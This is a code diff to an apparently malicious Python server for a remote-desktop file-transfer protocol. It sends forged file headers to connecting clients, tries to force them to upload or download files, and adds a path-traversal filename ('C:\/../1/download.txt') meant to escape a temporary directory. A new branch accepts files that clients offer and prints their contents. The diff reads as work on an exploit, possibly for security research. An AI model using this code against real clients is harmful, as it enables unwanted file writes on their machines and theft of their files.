@@ -54,8 +54,9 @@ async def ftServer(server: Server):
                 print("autorize")
                 # authorize
                 await server.sendFileTransfer(FileTransferMessages.FileTransferAccess, 0, 1, 0, bytes())
-                path = "C:\\upload.txt"
-                await server.sendFileTransfer(FileTransferMessages.FileAcceptHeader, 0, 0, len(path), path.encode("latin-1"))
+                # force upload => doesnt work
+                #path = "C:\\upload.txt"
+                #await server.sendFileTransfer(FileTransferMessages.FileAcceptHeader, 0, 0, len(path), path.encode("latin-1"))
             elif type == FileTransferMessages.FileHeader:
                 print(f"fileheader: {size}")
                 if size > 0:
@@ -72,7 +73,8 @@ async def ftServer(server: Server):
                     if data.decode("latin-1") != "C:\\":
                         print("force sending file")
                         # force dl
-                        path = "C:\\download.txt,04/20/2023 13:12"
+                        # try to dribble temp file name by prepending /../
+                        path = "C:\\/../1/download.txt,04/20/2023 13:12"
                         # length: path, size 4
                         await server.sendFileTransfer(FileTransferMessages.FileHeader, 0, 4, len(path), path.encode("latin-1"))
                         server.writer.write(int(0).to_bytes(4, "big")) # append size
@@ -93,12 +95,24 @@ async def ftServer(server: Server):
                         msg += b"\x00\x00\x00\x00\x00\x00\x00\x00"
                         await server.sendFileTransfer(FileTransferMessages.DirPacket, 1, 0, 3, msg)
             elif type == FileTransferMessages.FileTransferRequest:
-                print(f"wants {data.decode('latin-1')}. sending fake file")
-                # force dl
-                path = "C:\\download.txt,04/20/2023 13:12"
+                # force upload
+                path = "C:\\upload.txt"
+                await server.sendFileTransfer(FileTransferMessages.FileAcceptHeader, 0, 0, len(path), path.encode("latin-1"))
+                # dl
+                #print(f"wants {data.decode('latin-1')}. sending fake file")
+                #path = "C:\\download.txt,04/20/2023 13:12"
                 # length: path, size 4
-                await server.sendFileTransfer(FileTransferMessages.FileHeader, 0, 4, len(path), path.encode("latin-1"))
-                server.writer.write(int(0).to_bytes(4, "big")) # append size
+                #await server.sendFileTransfer(FileTransferMessages.FileHeader, 0, 4, len(path), path.encode("latin-1"))
+                #server.writer.write(int(0).to_bytes(4, "big")) # append size
+            elif type == FileTransferMessages.FileTransferOffer:
+                print("offered file")
+                # accept
+                path = "C:\\upload.txt"
+                await server.sendFileTransfer(FileTransferMessages.FileAcceptHeader, 0, 0, len(path), path.encode("latin-1"))
+                sizeH = await server.reader.readexactly(4)
+            elif type == FileTransferMessages.FilePacket:
+                print("sent file")
+                print(data)
         else:
             print(f"unknown message type {message_type}")
     
